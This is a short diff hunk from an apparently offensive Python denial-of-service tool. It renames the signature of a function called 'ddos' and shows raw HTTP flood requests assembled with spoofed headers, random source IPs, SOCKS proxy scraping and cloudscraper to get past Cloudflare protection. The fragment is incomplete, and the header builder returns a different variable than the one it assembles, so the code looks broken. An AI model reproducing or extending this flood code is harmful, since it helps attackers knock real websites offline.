@@ -2448,7 +2448,7 @@ def Headers(method):
         request = post_host + post_again + get_host + socks + forward + connection + mozila + forwards + header + useragent + accept + length + randomip + referer + content + "\r\n"
     return header
 
-def ddos(times):
+def ddos():
     socksCrawler()
     scraper = cloudscraper.create_scraper()
     get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
